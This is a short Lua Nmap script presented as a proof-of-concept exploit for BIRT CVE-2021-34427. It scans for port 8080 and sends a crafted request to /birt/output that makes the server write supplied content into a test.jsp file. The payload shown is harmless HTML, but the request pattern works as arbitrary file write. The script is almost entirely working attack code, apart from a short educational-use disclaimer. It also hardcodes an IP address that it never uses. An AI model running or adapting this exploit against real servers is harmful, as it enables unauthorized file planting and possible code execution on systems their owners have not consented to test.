
--HEAD--

local http = require "http"
local shortport = require "shortport"
local ip_addr ="14.99.184.178"

description =[[a poc exploit for the BIRT vulnerability CVE-2021-34427
DISCLAIMER: THIS SCRIPT IS MEANT ONLY FOR EDUCATIONAL PURPOSES. ANY ILLEGAL USE IS PROHIBITED]]

author="kushalr3ddy"

categories ={"exploit","intrusive","vuln"}

--RULE
portrule = function(host, port)
    return port.number == 8080 and port.state == "open" and port.protocol == "tcp"
end

-- ACTION
local function check(url)
    
    local response = http.get(url)

    if response and response.status == 200 then
        print("HTTP GET request to " .. url .. " successful.")
        print("Response code:", response.status)
        print("Response body:")
        print(response.body)
    else
        print("HTTP GET request to " .. url .. " failed.")
    end
end

action = function(host)
    
    print("*****************")
    print("Port 8080 is open on host:", host.ip)
    print("CHECKING EXPLOIT...")
    port = "8080"
    dir_path = "/birt/output?__report=test.rptdesign&__format=pdf&__overwrite=true&__document=./test.jsp&sample="
    payload ="%3Chtml%3E%0A%3Ctitle%3Ellmao%3C%2Ftitle%3E%0A%3Cbody%3E%0A%3Cimg%20src%3D%22https%3A%2F%2Fc4.wallpaperflare.com%2Fwallpaper%2F966%2F989%2F139%2Fshrek-movies-animated-movies-dreamworks-hd-wallpaper-preview.jpg%22%3E%0A%3C%2Fbody%3E%0A%3C%2Fhtml%3E"
    print("checking url:")
    url = "http://" .. host.ip .. ":" .. port .. dir_path.. payload
    print(url)
    
    --print("path:" .._path)
    --print("payload:" ..payload)
    check(url)

    print("*****************")

end